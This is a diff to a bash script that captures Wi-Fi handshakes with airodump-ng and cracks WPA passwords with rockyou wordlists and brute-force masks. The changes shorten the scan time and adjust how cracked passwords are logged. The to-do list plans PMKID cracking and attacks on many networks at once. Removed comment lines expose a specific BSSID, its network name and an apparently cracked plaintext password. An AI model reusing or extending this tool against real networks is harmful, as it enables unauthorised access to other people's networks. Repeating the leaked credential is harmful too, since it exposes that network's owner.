@@ -1,23 +1,20 @@
 #!/bin/bash
 
-# version: 3.5.3 20/5/25 02:00
+# version: 3.5.3 20/5/25 02:35
 
 
 ### Changlog ###
 	# Bug fixes.
 
+
 ### FIX ###
 	# delay between scan to output
 
-# Remove password not cracked if we cracked it later
-#We got handshake for (66:20:E3:14:C4:4E): Ico2G                                    at 00:14 21/05/25
-#The Wi-Fi password is:   Jgs8g2#1F+
-#Password not cracked with Brute-Force of this masking: Jgs?d?l?d#?u
 
 ### To Do ###
 	# Add Hashcat options for auto configure combinations. + Add possibilities calc. + show the mask better. + option to remove wrong mask.
 	# run all networks or range of them at the same time.
-	# add more dictioneries than rockyou?
+	# add more dictioneries than rockyou? or change the default from rockyou - LOOK for better WIFI wordlist
 	# specific passwords lists for different vendors
 	# functions to crack PMKID (using hcxpcapngtool..)
 	# default vendors length (for example: ZTE - 8 capital and numbers) with hashcat
@@ -27,6 +24,14 @@
 
 
 
+
+
+
+
+
+
+
+#######################    Instructions    #######################
 # Start the script while connected to internet in order to download rockyou wordlist if not exist in it's path And OUI file for vendors name of devices and routers (will help identify farther attacks).
 
 # **IMPORTANT** for Alfa AWUS036AXML wifi card:
@@ -185,7 +190,7 @@ function spoof_adapter_mac() {
 # ------------------------------
 function network_scanner() {	
         # Scan 15 seconds for wifi networks   
-        countdown_duration=15
+        countdown_duration=5
         sudo gnome-terminal --geometry=110x35-10000-10000 -- bash -c "sudo timeout ${countdown_duration}s airodump-ng --band abg ${wifi_adapter}mon --ignore-negative-one --output-format csv -w $targets_path/Scan/Scan-$current_date"        
 
         echo -e "\n\n\e[1;34mScanning available WiFi Networks ($countdown_duration s):\e[0m"
@@ -682,10 +687,9 @@ echo -e "\n\e[1mCracking Wi-Fi password using:\e[0m $dict_file \e[1m->>\e[0m\n"
     if [ -f "$targets_path/$bssid_name/$bssid_name-wifi_password.txt" ]; then
         wifi_pass=$(grep "$bssid_name_original" "$targets_path/$bssid_name/$bssid_name-wifi_password.txt" | awk -F"$bssid_name_original:" '{print $2}')
         echo -e "\033[1;34mThe Wi-Fi password of\033[0m \033[1;31m\033[1m$bssid_name_original\033[0m \033[1;34mis:\033[0m\t\033[1;33m$wifi_pass\033[0m"
-        
         bssid_name_escaped=$(printf '%s' "$bssid_name" | sed -e 's/[]\/$*.^[]/\\&/g')
+        sed -i "/We got handshake for ($bssid_address): $bssid_name_escaped/ { N; /\nPassword not cracked with/ { s/\nPassword not cracked with selected wordlist// } }" "$targets_path/wifi_passwords.txt"
         sed -i "/We got handshake for ($bssid_address): $bssid_name_escaped/a The Wi-Fi password is:   $wifi_pass" "$targets_path/wifi_passwords.txt"
-        
         rm -r "$targets_path/$bssid_name"
         exit 1
     else
@@ -855,6 +859,7 @@ function brute-force_attack() {
         wifi_pass=$(grep "$bssid_name_original" "$targets_path/$bssid_name/$bssid_name-wifi_password.txt" | awk -F"$bssid_name_original:" '{print $2}')
         echo -e "\033[1;34mThe wifi password of\033[0m \033[1;31m\033[1m$bssid_name_original\033[0m \033[1;34mis:\033[0m	\033[1;33m$wifi_pass\033[0m"
         bssid_name_escaped=$(printf '%s' "$bssid_name" | sed -e 's/[]\/$*.^[]/\\&/g')
+        sed -i "/We got handshake for ($bssid_address): $bssid_name_escaped/ { N; /\nPassword not cracked with/ { s/\nPassword not cracked with selected wordlist// } }" "$targets_path/wifi_passwords.txt"
         sed -i "/We got handshake for ($bssid_address): $bssid_name_escaped/a The Wi-Fi password is:   $wifi_pass" "$targets_path/wifi_passwords.txt"
         rm -r $targets_path/"$bssid_name" 
         exit 1
